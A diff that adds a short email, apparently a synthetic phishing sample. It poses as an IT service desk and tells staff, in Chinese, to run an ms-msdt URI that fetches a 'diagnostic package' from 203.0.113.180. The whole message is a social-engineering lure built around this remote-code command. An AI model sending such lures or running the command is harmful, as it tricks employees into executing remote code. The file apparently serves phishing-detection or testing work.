@@ -1,0 +1,11 @@
+From: =?utf-8?B?SVQg5pyN5Yqh5Y+w?= <it@msdt-relay12.example>
+To: staff@corp.internal
+Date: Tue, 22 Sep 2026 10:26:00 +0800
+Message-ID: <0016-b29@synth.example>
+Subject: 诊断包（双击运行）
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+远程诊断包已生成，双击运行后会自动收集信息：
+ms-msdt:unsignedpackage//203.0.113.180/diag/
+（或复制到运行窗口执行）
